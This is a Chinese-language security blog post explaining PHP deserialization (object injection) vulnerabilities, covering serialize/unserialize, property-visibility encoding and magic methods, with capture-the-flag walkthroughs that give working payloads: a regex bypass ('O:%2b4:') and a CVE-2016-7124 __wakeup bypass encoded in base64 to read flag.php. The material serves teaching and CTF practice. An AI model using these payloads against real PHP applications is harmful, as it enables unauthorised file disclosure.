<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        对象注入（反序列化漏洞） - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞形成原因"><span class="toc-text">漏洞形成原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及到的函数"><span class="toc-text">涉及到的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数作用分析"><span class="toc-text">函数作用分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#特殊变量类型–-gt-对象"><span class="toc-text">特殊变量类型–&gt;对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#public"><span class="toc-text">public</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#类中的魔法函数"><span class="toc-text">类中的魔法函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造函数：（-construct-）对象初始化时会自动调用此方法"><span class="toc-text">构造函数：（__construct()）对象初始化时会自动调用此方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#析构函数：（-destruct-）对象销毁的时候自动调用"><span class="toc-text">析构函数：（__destruct()）对象销毁的时候自动调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString："><span class="toc-text">__toString：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sleep"><span class="toc-text">__sleep()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call"><span class="toc-text">__call()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#invoke"><span class="toc-text">__invoke</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用到-wakeup-的CTF例题"><span class="toc-text">利用到__wakeup()的CTF例题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#类似与ROP的构造payload"><span class="toc-text">类似与ROP的构造payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#普通成员函数"><span class="toc-text">普通成员函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session反序列化漏洞"><span class="toc-text">session反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#存储机制"><span class="toc-text">存储机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#这里用OJ平台上的一个题来做演示"><span class="toc-text">这里用OJ平台上的一个题来做演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP链构造"><span class="toc-text">POP链构造</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        对象注入（反序列化漏洞）
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2019-04-17 17:10:21</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#常见漏洞" title="常见漏洞">常见漏洞</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>序列化和反序列化给我们提供了一种简单的方法用来传递对象</p>
<a id="more"></a>
<h3 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h3><p>序列化和反序列化操作本质上来说是没有危害的，那么形成漏洞的原因是：用户可控的数据进行序列化和反序列化，因此，关键还是在于可控不可控</p>
<h3 id="涉及到的函数"><a href="#涉及到的函数" class="headerlink" title="涉及到的函数"></a>涉及到的函数</h3><p>serialize： 产生一个可存储的值的表示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">serialize ( mixed $value ) : string</span><br><span class="line">serialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</span><br><span class="line"></span><br><span class="line">这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。</span><br><span class="line"></span><br><span class="line">想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。serialize() 可处理除了 resource 之外的任何类型。甚至可以 serialize() 那些包含了指向其自身引用的数组。你正 serialize() 的数组／对象中的引用也将被存储。</span><br><span class="line"></span><br><span class="line">当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。</span><br></pre></td></tr></table></figure></p>
<p>unserialize：从已存储的表示中创建 PHP 的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">unserialize ( string $str ) : mixed</span><br><span class="line">unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</span><br></pre></td></tr></table></figure></p>
<h3 id="函数作用分析"><a href="#函数作用分析" class="headerlink" title="函数作用分析"></a>函数作用分析</h3><p>可以序列化的变量类型：int、double、布尔、数组、字符串、对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$bool_t = True;</span><br><span class="line">$bool_f = False;</span><br><span class="line">echo &apos;$bool_t-&gt; &apos;.serialize($bool_t).&quot;\n&quot;;</span><br><span class="line">echo &apos;$bool_f-&gt; &apos;.serialize($bool_f).&quot;\n&quot;;</span><br><span class="line">$int = 123;</span><br><span class="line">echo &apos;$int-&gt; &apos;.serialize($int).&quot;\n&quot;;</span><br><span class="line">$double = 123.000;</span><br><span class="line">echo &apos;$double-&gt; &apos;.serialize($double).&quot;\n&quot;;</span><br><span class="line">$Null = Null;</span><br><span class="line">echo &apos;$Null-&gt; &apos;.serialize($Null).&quot;\n&quot;;</span><br><span class="line">$string = &quot;radish&quot;;</span><br><span class="line">echo &apos;$string-&gt; &apos;.serialize($string).&quot;\n&quot;;</span><br><span class="line">$array = array(1,2,3,4,5,6);</span><br><span class="line">echo &apos;$array-&gt; &apos;.serialize($array).&quot;\n&quot;;</span><br><span class="line">class class_test</span><br><span class="line">&#123;</span><br><span class="line">	public $str=&quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$object = new class_test();</span><br><span class="line">echo &apos;$object-&gt; &apos;.serialize($object).&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>输出：<br><img src="https://s2.ax1x.com/2019/04/17/AzNNrD.png" alt> </p>
<h3 id="特殊变量类型–-gt-对象"><a href="#特殊变量类型–-gt-对象" class="headerlink" title="特殊变量类型–&gt;对象"></a>特殊变量类型–&gt;对象</h3><p>在类中，属性可以有三种方式，public、protected、private，不同的属性经过序列化之后会有细微的不同</p>
<h4 id="public"><a href="#public" class="headerlink" title="public"></a>public</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test_public&#123;</span><br><span class="line">    public $a = &quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class test_protected&#123;</span><br><span class="line">    protected $a = &quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class test_private&#123;</span><br><span class="line">    private $a = &quot;123&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$obj_1 = new test_public();</span><br><span class="line">echo serialize($obj_1).&quot;\n&quot;;</span><br><span class="line">$obj_2 = new test_protected();</span><br><span class="line">echo serialize($obj_2).&quot;\n&quot;;</span><br><span class="line">$obj_3 = new test_private();</span><br><span class="line">echo serialize($obj_3).&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>out：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  html php test.php</span><br><span class="line">O:11:&quot;test_public&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">O:14:&quot;test_protected&quot;:1:&#123;s:4:&quot;*a&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">O:12:&quot;test_private&quot;:1:&#123;s:15:&quot;test_privatea&quot;;s:3:&quot;123&quot;;&#125;</span><br><span class="line">➜  html</span><br></pre></td></tr></table></figure></p>
<p>如果直接输出的话不同之处可能显示的不太完整，我们把输出写进文件里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  html php test.php &gt; out.txt</span><br></pre></td></tr></table></figure></p>
<p>利用hexdump来查看该文件的16进制</p>
<p><img src="https://s2.ax1x.com/2019/04/17/AzNwad.png" alt> </p>
<p>可以看出来public属性什么都没有加，protected属性在前面加了一个*号，private属性在前面加上了自己的类名，在protected、private属性加上的前缀值和变量名字前面都有00字节来填充</p>
<blockquote>
<p>这个细节在我们后面构造payload的时候是很重要的</p>
</blockquote>
<h3 id="类中的魔法函数"><a href="#类中的魔法函数" class="headerlink" title="类中的魔法函数"></a>类中的魔法函数</h3><h4 id="构造函数：（-construct-）对象初始化时会自动调用此方法"><a href="#构造函数：（-construct-）对象初始化时会自动调用此方法" class="headerlink" title="构造函数：（__construct()）对象初始化时会自动调用此方法"></a>构造函数：（__construct()）对象初始化时会自动调用此方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;I am __construct&quot;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new test();</span><br><span class="line"></span><br><span class="line">echo &quot;\ntest\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  html php index.php</span><br><span class="line">I am __construct</span><br><span class="line">test</span><br><span class="line">➜  html</span><br></pre></td></tr></table></figure></p>
<h4 id="析构函数：（-destruct-）对象销毁的时候自动调用"><a href="#析构函数：（-destruct-）对象销毁的时候自动调用" class="headerlink" title="析构函数：（__destruct()）对象销毁的时候自动调用"></a>析构函数：（__destruct()）对象销毁的时候自动调用</h4><ul>
<li>用户自动销毁对象（unset($obj_name)）</li>
<li>当程序结束时由引擎自动销毁（也就是页面执行结束的时候）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;I am __destruct&quot;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new test();</span><br><span class="line"></span><br><span class="line">echo &quot;\ntest\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>输出：（注意输出顺序）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  html php index.php</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">I am __destruct%                                                                                                         ➜  html</span><br></pre></td></tr></table></figure></p>
<h4 id="toString："><a href="#toString：" class="headerlink" title="__toString："></a>__toString：</h4><p>（public __toString ( void ) : string）<br>该方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">   	public $test=&quot;test&quot;;</span><br><span class="line">   	function __toString()</span><br><span class="line">   	&#123;</span><br><span class="line">   		return &quot;I am __toString&quot;;</span><br><span class="line">   	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new baby();</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>out：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  html php index.php </span><br><span class="line">I am __toString%                                                                                                         ➜  html</span><br></pre></td></tr></table></figure></p>
<p>CTF实例：（安恒杯月赛）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1); </span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if(isset($this-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($filename))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($filename); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">if (isset($_GET[&apos;data&apos;]))  </span><br><span class="line">&#123; </span><br><span class="line">    $data = $_GET[&apos;data&apos;];</span><br><span class="line">    preg_match(&apos;/[oc]:\d+:/i&apos;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;Hacker!&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(&quot;./test.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>通过代码审计可以得知这道题是通过反序列化触发toString函数从而实现任意文件包含，触发漏洞点在于把反序列化的对象直接用echo输出，那么会自动调用baby类中__toString魔术函数</p>
<p>在本地构造读取flag.php的类和对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class baby </span><br><span class="line">&#123;</span><br><span class="line">   	public $file=&quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new baby();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>payload：?data=O:4:”baby”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p>发现不行，程序通过正则表达式限制了可控的参数，不能是o/c:数字（大小写不敏感）</p>
<p>看别人wp上在“：”后面加一个+号可以绕过，但是由于是get传参，需要先进行url编码在进行传参<br>最后payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:%2b4:&quot;baby&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4><p>当一个对象将要反序列化之前的话、会先检查该类中是否存在__sleep魔术方法，方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
<h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4><p>当调用一个类中没有的函数时，如果类中存在__call函数，那么会先调用这个函数，该方法有两个参数，第一个参数 $function_name 会自动接收不存在的方法名，第二个 $args 则以数组的方式接收不存在方法的多个参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">	public function __call($a,$b)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;I am __call!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">$a-&gt;hahah();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到实例化一个对象，之后又调用了类里面没有的函数，根据页面输入可以判断出成功的执行了__call函数</p>
<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h4><p>当一个类被当做函数调用的时候，会默认先执行该魔术方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test</span><br><span class="line">&#123;</span><br><span class="line">	public function __invoke($a,$b)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;I am __invoke!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new test();</span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>经常用在反序列化操作中</p>
<h4 id="利用到-wakeup-的CTF例题"><a href="#利用到-wakeup-的CTF例题" class="headerlink" title="利用到__wakeup()的CTF例题"></a>利用到__wakeup()的CTF例题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class SoFun&#123; </span><br><span class="line">  protected $file=&apos;index.php&apos;;</span><br><span class="line">  function __destruct()&#123; </span><br><span class="line">    if(!empty($this-&gt;file)) &#123;</span><br><span class="line">      if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &apos;/&apos;)===false)</span><br><span class="line">        show_source(dirname (__FILE__).&apos;/&apos;.$this -&gt;file);</span><br><span class="line">      else</span><br><span class="line">        die(&apos;Wrong filename.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function __wakeup()&#123;</span><br><span class="line">   $this-&gt; file=&apos;index.php&apos;;</span><br><span class="line">  &#125; </span><br><span class="line">  public function __toString()&#123;</span><br><span class="line">  	return &apos;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&apos;file&apos;]))&#123; </span><br><span class="line">  show_source(&apos;index.php&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123; </span><br><span class="line">  $file=base64_decode($_GET[&apos;file&apos;]); </span><br><span class="line">  echo unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line">//key in flag.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>通过代码审计我们发现可以控制反序列化的参数，其中有一个类的析构函数是根据类中的$file属性来show_source $file的文件，但是其中有一个__wakeup魔术函数，这个函数实在反序列化对象后先调用的，在这个函数中把$file直接赋值成index.php，导致到析构函数读取的文件是index.php，题目提示key在flag.php中，那么我们就应该读取flag.php，这里需要绕过__wakeup函数，利用的漏洞是<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a> </p>
<p>漏洞利用过程：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
<p>本地测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class test&#123;</span><br><span class="line">	public $test = &quot;123&quot;;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;test=&quot;456&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct()</span><br><span class="line">	&#123;</span><br><span class="line">		echo $this-&gt;test;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// $a = new test();</span><br><span class="line">// echo serialize($a);</span><br><span class="line">unserialize(&apos;O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&apos;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>首先我们先实例化一个对象，并将其反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>将正常序列化的对象直接给反序列化，页面输出456，也就是说执行了__wakeup函数，那么我们把序列化字符串中表示属性个数的值修改成比原来大的任意数，页面返回123，说明没有执行__wakeup函数，完美绕过</p>
<p>然后在对应这一道题，先实例化一个对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    public $file=&quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new test();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br><span class="line">#O:4:&quot;test&quot;:1:&#123;s:7:&quot;*file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里需要注意的是属性值是protect，我们需要在*和file前面加上00字节，在进行base64加密一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">data = &apos;O:5:&quot;SoFun&quot;:2:&#123;s:7:&quot;\x00*\x00file&quot;;s:8:&quot;flag.php&quot;;&#125;&apos;</span><br><span class="line">print base64.b64encode(data)</span><br><span class="line"></span><br><span class="line"># Tzo1OiJTb0Z1biI6Mjp7czo3OiIAKgBmaWxlIjtzOjg6ImZsYWcucGhwIjt9</span><br></pre></td></tr></table></figure></p>
<p><img src="https://s2.ax1x.com/2019/04/17/AzNDPI.png" alt> </p>
